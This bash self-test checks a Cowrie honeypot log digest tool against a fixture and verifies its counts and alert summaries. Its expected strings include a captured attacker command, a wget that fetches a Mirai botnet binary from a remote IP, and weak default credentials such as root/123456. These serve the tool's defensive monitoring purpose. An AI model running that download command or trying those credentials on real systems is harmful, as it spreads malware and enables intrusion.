#!/usr/bin/env bash
# cowrie-digest self-test — runs the digest against a fixture log and
# verifies the aggregation. No network, no Cowrie required.
set -euo pipefail

SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE="${SRC_DIR}/tests/fixtures/sample_cowrie.jsonl"
TMP_CFG="$(mktemp)"
trap 'rm -f "${TMP_CFG}"' EXIT

cat > "${TMP_CFG}" <<EOF
COWRIE_LOG=${FIXTURE}
DIGEST_HOURS=876000
STATE_DIR=$(mktemp -d)
SENSOR_NAME=test-sensor
EOF

echo "==> running digest against fixture..."
OUT="$("${SRC_DIR}/digest.py" --print --config "${TMP_CFG}")"
echo "${OUT}"
echo ""

fail=0
check() {
    if grep -qF "$1" <<<"${OUT}"; then
        echo "PASS: report contains '$1'"
    else
        echo "FAIL: report missing '$1'" >&2
        fail=1
    fi
}

check "Connections:      4"
check "Unique IPs:       3"
check "Failed logins:    5"
check "Successful logins: 2"
check "Commands run:     3"
check "Files downloaded: 1"
check "198.51.100.23"
check "root/123456"
check "wget http://185.220.101.4/bins/mirai.x86"
check "http://185.220.101.4/bins/mirai.x86"
check "IPs that got a shell"

echo ""
echo "==> testing alert aggregation..."
python3 - "${SRC_DIR}" <<'PYEOF'
import sys
sys.path.insert(0, sys.argv[1])
from digest import build_alert_summary

successes = [("198.51.100.23", "root", "123456")] * 7 + [
    ("203.0.113.7", "admin", "admin")] * 2
downloads = [("198.51.100.23", "http://185.220.101.4/bins/mirai.x86", "ab12cd")]
out = build_alert_summary(successes, downloads, "test-sensor")
print(out)
assert "Successful logins: 9" in out, "count wrong"
assert "7x  198.51.100.23 → root/123456" in out, "top cred wrong"
assert "Malware downloads: 1" in out
assert "mirai.x86" in out
assert "sha256: ab12cd" in out
print("PASS: alert aggregation works")
PYEOF

echo ""
if [[ ${fail} -eq 0 ]]; then
    echo "==> ALL TESTS PASSED"
else
    echo "==> TESTS FAILED" >&2
    exit 1
fi
